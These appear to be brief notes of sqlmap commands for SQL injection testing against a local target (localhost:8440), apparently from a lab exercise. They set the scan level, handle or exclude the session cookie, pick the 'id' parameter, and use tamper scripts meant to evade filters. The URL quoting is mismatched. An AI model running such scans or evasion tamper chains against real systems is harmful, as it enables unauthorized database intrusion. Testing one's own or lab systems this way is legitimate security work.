--tamper="random,appendnullbyte,between,base64encode"
sqlmap -u 'http://localhost:8440/" --level=2
sqlmap -u 'http://localhost:8440/" --level=2 --cookie="PHPSESSID=..." --param-exclude="PHPSESSID"
sqlmap -u 'http://localhost:8440/" --level=2 --cookie="PHPSESSID=..." --skip="cookies"
sqlmap -u 'http://localhost:8440/" --level=2 --cookie="PHPSESSID=..." -p "id"
--tamper="between,randomcase"
